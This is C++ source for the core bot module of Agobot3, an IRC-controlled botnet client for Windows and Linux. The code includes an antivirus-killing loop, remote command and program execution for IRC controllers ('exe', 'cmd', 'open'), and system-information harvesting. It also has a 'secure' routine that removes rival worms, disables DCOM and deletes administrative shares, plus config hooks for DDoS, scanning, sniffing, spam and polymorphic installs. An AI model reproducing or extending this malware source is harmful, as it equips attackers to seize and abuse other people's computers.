/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"

CBot::CBot() { m_bJoined=false; }

/* No Comment :P */

bool CBot::Init()
{	init_random();
	CString sTemp;		sTemp.Format("%d", brandom(1024, 32000));
	CString sTempFTP;	sTempFTP.Format("%d", brandom(1024, 32000));

	REGCVAR(bot_ftrans_port,		sTemp.CStr(),		false,	0);
	REGCVAR(bot_ftrans_port_ftp,	sTempFTP.CStr(),	false,	0);
	REGCVAR(si_chanpass,			"",					false,	0);
	REGCVAR(si_mainchan,			"",					false,	0);
	REGCVAR(si_nickprefix,			"",					false,	0);
	REGCVAR(si_port,				"",					false,	0);
	REGCVAR(si_server,				"",					false,	0);
	REGCVAR(si_servpass,			"",					false,	0);
	REGCVAR(si_usessl,				"",					false,	0);
	REGCVAR(si_nick,				"",					false,	0);
	REGCVAR(bot_version,			VERSION_BOXOCIDE,	false,	0);
	REGCVAR(bot_filename,			"",					false,	0);
	REGCVAR(bot_id,					"",					false,	0);
	REGCVAR(bot_prefix,				"",					false,	0);
	REGCVAR(bot_timeout,			"",			    	false,	0);
	REGCVAR(bot_seclogin,			"",					false,	0);
	REGCVAR(bot_compnick,			"",					false,	0);
	REGCVAR(bot_randnick,			"",					false,	0);
	REGCVAR(bot_meltserver,			"",					false,	0);
	REGCVAR(bot_mutex_name,			"",					false,	0);
	REGCVAR(bot_topiccmd,			"",					false,	0);
	REGCVAR(do_speedtest,			"",					false,	0);
	REGCVAR(do_avkill,				"",					false,	0);
	REGCVAR(do_stealth,				"",					false,	0);
	REGCVAR(as_valname,				"",					false,	0);
	REGCVAR(as_enabled,				"",					false,	0);
	REGCVAR(as_service,				"",					false,	0);
	REGCVAR(as_service_name,		"",					false,	0);
	REGCVAR(scan_maxthreads,		"",					false,	0);
	REGCVAR(scan_maxsockets,		"",					false,	0);
	REGCVAR(ddos_maxthreads,		"",					false,	0);
	REGCVAR(redir_maxthreads,		"",					false,	0);
	REGCVAR(identd_enabled,			"",					false,	0);
	REGCVAR(cdkey_windows,			"",					false,	0);
	REGCVAR(scaninfo_chan,			"",					false,	0);
	REGCVAR(scaninfo_level,			"",					false,	0);
	REGCVAR(spam_aol_channel,		"",					false,	0);
	REGCVAR(spam_aol_enabled,		"",					false,	0);
	REGCVAR(sniffer_enabled,		"",					false,	0);
	REGCVAR(sniffer_channel,		"",					false,	0);
	REGCVAR(vuln_channel,			"",					false,	0);
	REGCVAR(inst_polymorph,			"",					false,	0);
	REGCVAR(latency_sensitivity,	"",					false,	0);
	REGCVAR(latency_desired,		"",					false,	0);

	Config();

	CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
	g_pMainCtrl->m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
	m_lStartTime=(unsigned long)GetTickCount()/1000;

#ifdef _WIN32
	// Create several mutexes the sasser worm uses, but dont wait on them
	CreateMutex(NULL, TRUE, "Jobaka3l");
	CreateMutex(NULL, TRUE, "Jobaka3");
	CreateMutex(NULL, TRUE, "JumpallsNlsTillt");
	CreateMutex(NULL, TRUE, "SkynetSasserVerionWithPingFast");
#endif // _WIN32

	return true;
}


void CBot::Recv(CMessage *pMsg, bool bInternal)
{
#ifdef DBGCONSOLE
	if(pMsg->sDest[0]=='#')
		g_cConsDbg.Log(5, "<%s> %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
	else
		g_cConsDbg.Log(5, "*%s* %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
#endif

	if(pMsg->sDest[0]=='#') pMsg->sReplyTo.Assign(pMsg->sDest); else pMsg->sReplyTo.Assign(pMsg->sSrc);
	if(pMsg->bNotice) pMsg->sReplyTo.Assign(pMsg->sSrc);
	if(pMsg->bOutchan) {
		CString sOutchan; sOutchan.Assign(pMsg->sChatString.Mid(pMsg->sChatString.Find(" -o")+3));
		pMsg->sReplyTo.Assign(sOutchan);
	}
	pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));

	// Check if its a bot command by comparing the first byte to the bot_prefix value
	if(pMsg->sChatString[0]==bot_prefix.sValue[0]) {
		if(!pMsg->sCmd.Compare("bot.repeat")) {
			if(!pMsg->sChatString.Token(1, " ").Compare("") || !pMsg->sChatString.Token(2, " ").Compare("")) return;
			int i=0, iNum=atoi(pMsg->sChatString.Token(1, " ").CStr()), iDelay=atoi(pMsg->sChatString.Token(2, " ").CStr());
			if(!iNum || !iDelay) return;
			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
			sNewCStr=sNewCStr.Mid(sNewCStr.Find(' '));
			pMsg->sChatString.Assign(sNewCStr); pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
			if(!bInternal)
				for(i=0;i<iNum;i++) { Sleep(iDelay*1000); HandleMsg(pMsg); }
			else
				for(i=0;i<iNum;i++) { Sleep(iDelay*1000); HandleMsgInt(pMsg); }
		} else
			if(!bInternal)
				HandleMsg(pMsg);
			else
				HandleMsgInt(pMsg);
	} else if(!pMsg->sChatString.Token(0, " ").Compare(g_pMainCtrl->m_sUserName)) {
		// botname .command mod - deejayfuzion
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return;
		pMsg->sChatString.Assign(pMsg->sChatString.Mid(pMsg->sChatString.Token(0, " ").GetLength()+1));
		pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " "));
		this->Recv(pMsg, bInternal);
	} else {
		// fallback handler
		HandleFallBack(pMsg);
	}
}

bool CBot::HandleMsg(CMessage *pMsg)
{	// If it's no login command and the user isn't logged in yet, break
	if(pMsg->sCmd.Compare(g_pMainCtrl->m_pMac->m_cmdLogin.szName) && !g_pMainCtrl->m_pMac->FindLogin(pMsg->sSrc)) return false;
	else
	{	// If the user isn't logged in yet, bot_seclogin is enabled and its no channel message, break;
		if(!g_pMainCtrl->m_pMac->FindLogin(pMsg->sSrc))
			if(bot_seclogin.bValue) if(pMsg->sDest[0]!='#') return false;
		return HandleMsgInt(pMsg); } }

bool CBot::HandleMsgInt(CMessage *pMsg)
{	// Find the command using the command handler
	CommandInfo *pCommand=g_pMainCtrl->m_pCommands->FindCommandByName(pMsg->sCmd.CStr(), true);
	// If the command is found, let the command hander handle it

	if(pCommand) return pCommand->pHandler->HandleCommand(pMsg); else return false; }

bool CBot::HandleFallBack(CMessage *pMsg)
{	// Fail if sender isn't logged in, no way to login via fallback
	if(!g_pMainCtrl->m_pMac->FindLogin(pMsg->sSrc)) return false;
	// Distribute to the active fallback handler
	CommandInfo *pCommand=g_pMainCtrl->m_pCommands->FindFallBack();
	// If the command is found, let the command hander handle it
	if(pCommand) return pCommand->pHandler->HandleCommand(pMsg); else return false; }

bool CBot::Think() {
	if(!g_pMainCtrl->m_bRunning) return false;
	static unsigned long lLastAVKill;

	// If the IRC connection timed out, reset it
	if((GetTickCount()-g_pMainCtrl->m_pIRC->m_lLastRecv) > (unsigned int)bot_timeout.iValue)
	{	g_pMainCtrl->m_pIRC->Fail(); g_pMainCtrl->m_pIRC->m_lLastRecv=GetTickCount(); }

#ifndef _DEBUG
	// Kill all AV processes every 20 seconds
	if(g_pMainCtrl->m_pBot->do_avkill.bValue){
		if((GetTickCount()-lLastAVKill) > 20000)
		{	KillAV(); lLastAVKill=GetTickCount(); }}
#endif

	return true; }

bool CBot::HandleCommand(CMessage *pMsg)
{	
	if(!pMsg->sCmd.Compare(m_cmdRemove.szName)) 
	{
		CString sDblCheck(pMsg->sChatString.Token(1, " ", true));
		if(!sDblCheck.Compare(g_pMainCtrl->m_sUserName)) 
		{
			g_pMainCtrl->m_pBot->RunScript(SCRIPT_ONREMOVE);
			#ifdef WIN32
				if(g_pMainCtrl->m_pBot->as_enabled.bValue)
					g_pMainCtrl->m_pInstaller->RegStartDel(g_pMainCtrl->m_pBot->as_valname.sValue);
				if(g_pMainCtrl->m_pBot->as_service.bValue)
					ServiceDel(g_pMainCtrl->m_pBot->as_service_name.sValue);
			#endif
			g_pMainCtrl->m_pInstaller->Uninstall();
			#ifdef _WIN32
					ExitProcess(0);
			#else
					exit(0);
			#endif // _WIN32
		}
	}

	else if(!pMsg->sCmd.Compare(m_cmdExecute.szName)) {
		CString sText(pMsg->sChatString.Token(2, " ", true)); bool bVisible=atoi(pMsg->sChatString.Token(1, " ").CStr())==1;
#ifdef WIN32
		CString sTextExp; ExpandEnvironmentStrings(sText.CStr(), sTextExp.GetBuffer(8192), 8192); // interpret environment variables
		sText.Assign(sTextExp); PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO)); sinfo.cb=sizeof(sinfo);
		if(bVisible) sinfo.wShowWindow=SW_SHOW; else sinfo.wShowWindow=SW_HIDE;
		if(!CreateProcess(NULL, sText.Str(), NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) {
			pMsg->pReply->DoReply(pMsg, "couldn't execute file."); return false; }
#else
		CString sCmdBuf; sCmdBuf.Format("/bin/sh -c \"%s\"", sText.CStr());
		if(system(sCmdBuf.CStr())==-1) { pMsg->pReply->DoReplyF(pMsg, "couldn't execute file."); return false; }
#endif
		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdOpen.szName)) {
		if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3))) return false;
		CString sText; sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]); bool bRet=false;
#ifdef WIN32
		bRet=(int)ShellExecute(0, "open", sText.CStr(), NULL, NULL, SW_SHOW)>=32;
#else
		bRet=system(sText.CStr())>0;
#endif
		if(bRet) return pMsg->pReply->DoReply(pMsg, "file opened.");
		else return pMsg->pReply->DoReply(pMsg, "couldn't open file."); }

#ifdef _WIN32
	else if(!pMsg->sCmd.Compare(m_cmdDns.szName)) {
		CString sReply; hostent *pHostent=NULL; in_addr iaddr;
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		unsigned long addr=inet_addr(pMsg->sChatString.Token(1, " ").CStr());
	
		if(addr!=INADDR_NONE) {
			pHostent=gethostbyaddr((char*)&addr, sizeof(struct in_addr), AF_INET);
			if(pHostent) {
				return pMsg->pReply->DoReplyF(pMsg, "%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), pHostent->h_name); }
		} else {
			pHostent=gethostbyname(pMsg->sChatString.Token(1, " ").CStr());
			if(pHostent) {
				iaddr=*((in_addr*)*pHostent->h_addr_list);
				return pMsg->pReply->DoReplyF(pMsg, "%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), inet_ntoa(iaddr)); } }
		
		if(!pHostent) {
			return pMsg->pReply->DoReplyF(pMsg, "couldn't resolve host \"%s\"!", pMsg->sChatString.Token(1, " ").CStr()); } }
#endif // _WIN32

	else if(!pMsg->sCmd.Compare(m_cmdAbout.szName)) {
		return pMsg->pReply->DoReplyF(pMsg, "%s", g_pMainCtrl->m_sNameVerStr.CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdId.szName)) {
		return pMsg->pReply->DoReply(pMsg, bot_id.sValue.Str()); }

	else if(!pMsg->sCmd.Compare(m_cmdNick.szName)) {
		g_pMainCtrl->m_sUserName.Format("%s", pMsg->sChatString.Token(1, " ", true).Mid(0, 32).CStr());
		g_pMainCtrl->m_pIRC->SendRawFormat("NICK %s\r\n", g_pMainCtrl->m_sUserName.CStr());
		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdQuitBNC.szName) || !pMsg->sCmd.Compare(m_cmdDie.szName)) {
		g_pMainCtrl->m_pIRC->m_bRunning=false; return true; }

	else if(!pMsg->sCmd.Compare(m_cmdSysInfo.szName)) {
		return pMsg->pReply->DoReply(pMsg, SysInfo().Str()); }

	else if(!pMsg->sCmd.Compare(m_cmdLongUptime.szName)) {
		int iDays=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iDays) iDays=7;
		CString sUptime=LongUptime(iDays);
		if(sUptime.Compare("")) { return pMsg->pReply->DoReply(pMsg, sUptime.Str()); }
		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdHighSpeed.szName)) {
		int iSpeed=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iSpeed) iSpeed=10000;
		CString sSpeed=g_pMainCtrl->m_cStartupThread.m_speedData.lTotalSpeed;
		if(iSpeed<=atoi(sSpeed.CStr())) if(sSpeed.Compare(""))
			pMsg->pReply->DoReplyF(pMsg, "Speed: %s kbit/s", sSpeed.Str());
		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdStatus.szName)) {
		return pMsg->pReply->DoReply(pMsg, Status().Str()); }

	else if(!pMsg->sCmd.Compare(m_cmdRndNick.szName)) {
		CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
		g_pMainCtrl->m_pIRC->SendRawFormat("NICK %s\r\n", sRndNick.CStr());
		g_pMainCtrl->m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdFlushDNS.szName)) {
#ifdef WIN32
		Execute("ipconfig.exe", "/flushdns");
#else
		Execute("nscd", "-i hosts");
#endif // WIN32
		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdSecure.szName)) {	
#ifdef WIN32
		// Set EnableDCOM to "N"
		HKEY hkey=NULL; DWORD dwSize=128; char szDataBuf[128];
		strcpy(szDataBuf, "N"); dwSize=strlen(szDataBuf);
		LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
		RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
		RegCloseKey(hkey);

		/* begin removal of (most)Bagle/(some)MyDoom */
		
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "Ssate.exe");
		RegCloseKey(hkey);
		KillProcess("irun4.exe");
		CString tmpBagle; GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"irun4.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "rate.exe");
		RegCloseKey(hkey);
		KillProcess("i11r54n4.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"i11r54n4.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "ssate.exe");
		RegCloseKey(hkey);
		KillProcess("winsys.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"winsys.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "ssgrate.exe");
		RegCloseKey(hkey);
		KillProcess("irun4.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"irun4.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "d3dupdate.exe");
		RegCloseKey(hkey);
		KillProcess("bbeagle.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"bbeagle.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "TaskMon");
		RegCloseKey(hkey);
		KillProcess("taskmon.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"taskmon.exe");
		DeleteFile(tmpBagle);

		// I-Worm.Bagle.z removal
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "drvddll.exe");
		RegCloseKey(hkey);
		KillProcess("drvsys.exe");
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"drvsys.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "Explorer");
		RegCloseKey(hkey);

		/* end removal of (most)Bagle/(some)MyDoom */

		// Remove the latest netsky
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "EasyAV");
		RegCloseKey(hkey);
		KillProcess("EasyAV.exe");
		GetWindowsDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"EasyAV.exe");
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "PandaAVEngine");
		RegCloseKey(hkey);
		KillProcess("PandaAVEngine.exe");
		GetWindowsDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"PandaAVEngine.exe");
		DeleteFile(tmpBagle);

		// Remove the latest W32.Sasser.Worm
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "avserve.exe");
		RegCloseKey(hkey);
		KillProcess("avserve.exe");
		GetWindowsDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"avserve.exe");
		DeleteFile(tmpBagle);

		// Remove the latest W32.Sasser.Worm.B/C
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "avserve2.exe");
		RegCloseKey(hkey);
		KillProcess("avserve2.exe");
		GetWindowsDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"avserve2.exe");
		DeleteFile(tmpBagle);

		// Remove the latest W32.Sasser.Worm.D
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, "skynetave.exe");
		RegCloseKey(hkey);
		KillProcess("skynetave.exe");
		GetWindowsDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),"skynetave.exe");
		DeleteFile(tmpBagle);
		
		/* begin removal of suspicious exe/services */

		ServiceDel((CString)"upnphost"); // secure UPNP

		/* end removal of suspicious exe/services */

		// Secure Shares
		Execute("net.exe", "share c$ /delete /y");
		Execute("net.exe", "share d$ /delete /y");
		Execute("net.exe", "share e$ /delete /y");
		Execute("net.exe", "share ipc$ /delete /y");
		Execute("net.exe", "share admin$ /delete /y");

		pMsg->pReply->DoReply(pMsg, "Bot Secured");

#endif
		return true; }

	
	else if(!pMsg->sCmd.Compare(m_cmdCommand.szName)) {	
#ifdef WIN32
		if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3))) return false;
		CString sText; sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]); bool bRet=false;
		CString sReplyBuf; sReplyBuf.Format("command (%s) executed.", sText.CStr());

		if(system(sText.CStr())==-1) { pMsg->pReply->DoReply(pMsg, "couldn't execute command."); return false; }
		else { pMsg->pReply->DoReply(pMsg, sReplyBuf.Str()); return false; }
#endif
		return true; }


	return false; }

CString CBot::SysInfo()
{	CString sSysInfo;
#ifdef WIN32
	int total=GetTickCount()/1000;
	MEMORYSTATUS memstat; OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat); verinfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO); GetVersionEx(&verinfo); char *os; char os2[140];
	if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==0)
	{	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)			os="95";
		if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT)					os="NT"; }
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==10)	os="98";
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==90)	os="ME";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==0)		os="2000";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==1)		os="XP";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==2)		os="2003";
	else																os="???";

	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0]!='\0')
	{	sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion); os=os2; }
	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	// *** PhaTTy <MOD> Changed ram: to ##MB/##MB , added box: , added user: </MOD>

	unsigned int vendor=cpu_detect_vendor();
	unsigned int family=cpu_detect_family();
	unsigned int model=cpu_detect_model();
	unsigned int stepping=cpu_detect_stepping();
	char vendor_buf[256], cpu_buf[256];
	cpu_get_string_short(vendor_buf, cpu_buf);
	unsigned int _3dnow_feat=cpu_detect_3dnow();
	char *szCPUExtStr; switch(_3dnow_feat)
	{	case 0: szCPUExtStr=""; break;
		case 1: szCPUExtStr=", 3DNow!"; break;
		case 2: szCPUExtStr=", Enh. 3DNow!"; break;
		default: szCPUExtStr=", 3DNow screwed"; break; }

	sSysInfo.Format("cpu: %s %s %dMHz (F:%d,M:%d,S:%d%s) ram: %dMB/%dMB os: %s up: %dd %dh %dm box: %s freespace: %s",
		vendor_buf, cpu_buf, cpuspeed(), family, model, stepping, szCPUExtStr,
		memstat.dwAvailPhys/1046528, memstat.dwTotalPhys/1046528, os,
		total/86400, (total%86400)/3600, ((total%86400)%3600)/60,
		szCompname, GetFreeDiskSpace().CStr());

#else
	FILE *fp=fopen("/proc/uptime", "r");
	float f1, f2;
	
	if(!fp) return CString("Error: Can't open /proc/uptime!");

	if(fscanf(fp, "%f %f", &f1, &f2)<2) return CString("Error: Invalid or changed /proc/uptime format!");

	fclose(fp);
	
	int days, hours, minutes;
	days=((abs((int)f1)/60)/60)/24;
	hours=((abs((int)f1)/60)/60)%24;
	minutes=(abs((int)f1)/60)%60;

	int iDistro=GetDistro(); char *szVersion; char *szKVersion;
	bool bGotVer=GetVersion(&szVersion, iDistro);
	bool bGotKVer=GetKVersion(&szKVersion, iDistro);
	
	if(!bGotVer) szVersion="Unknown\n"; if(!bGotKVer) szKVersion="Unknown\n";
	
#ifdef _WIN32

	sSysInfo.Format("cpu: %dMHz. os: %s. kernel: %s. uptime: %dd %dh %dm", cpuspeed(), szVersion, szKVersion, days, hours, minutes);
#else
	sSysInfo.Format("cpu: %dMHz, %d bogomips. os: %s. kernel: %s. uptime: %dd %dh %dm", cpuspeed(), GetBogoMips(), szVersion, szKVersion, days, hours, minutes);
#endif // _WIN32

	if(bGotVer) free(szVersion); if(bGotKVer) free(szKVersion);
#endif
	return sSysInfo; }

int CBot::UptimeDays() {
#ifdef WIN32
	int total=GetTickCount()/1000;
	OSVERSIONINFO verinfo;
	return total/86400;
#else
	FILE *fp=fopen("/proc/uptime", "r");
	float f1, f2; if(!fp) return 0;
	if(fscanf(fp, "%f %f", &f1, &f2)<2) { fclose(fp); return 0; }
	return ((abs((int)f1)/60)/60)/24;
#endif // WIN32
}

CString CBot::LongUptime(int iDays)  // If uptime > iDays days then bot will reply with uptime stats. - PhaTTy
{	CString sLongUptime;
	if (iDays == 0) return false;
	int total=GetTickCount()/1000;

	if(total/86400 >= iDays) sLongUptime.Format("uptime: %dd %dh %dm",total/86400, (total%86400)/3600, ((total%86400)%3600)/60);
	else return CString("");
	return sLongUptime; }

CString CBot::Status()
{	CString sStatus; unsigned long total, days, hours, minutes; total=(GetTickCount()/1000)-m_lStartTime;
	days=total/86400; hours=(total%86400)/3600; minutes=((total%86400)%3600)/60;
	sStatus.Format("%s ready. Up %dd %dh %dm.", g_pMainCtrl->m_sNameVerStr.CStr(), days, hours, minutes); return sStatus; }

REGOBJ(CBot, g_pBot, true, 1);
REGCMD(m_cmdAbout,			"about",		false,	g_pBot);
REGCMD(m_cmdDns,			"dns",			false,	g_pBot);
REGCMD(m_cmdExecute,		"exe",			false,	g_pBot);
REGCMD(m_cmdId,				"id",			false,	g_pBot);
REGCMD(m_cmdNick,			"nick",			false,	g_pBot);
REGCMD(m_cmdOpen,			"open",			false,	g_pBot);
REGCMD(m_cmdRemove,			"rm",			false,	g_pBot);
REGCMD(m_cmdRndNick,		"rndnick",		false,	g_pBot);
REGCMD(m_cmdStatus,			"status",		false,	g_pBot);
REGCMD(m_cmdSysInfo,		"sysinfo",		false,	g_pBot);
REGCMD(m_cmdLongUptime,		"longuptime",	false,	g_pBot);
REGCMD(m_cmdFlushDNS,		"flushdns",		false,	g_pBot);
REGCMD(m_cmdSecure,			"secure",		false,	g_pBot);
REGCMD(m_cmdCommand,		"cmd",			false,	g_pBot);

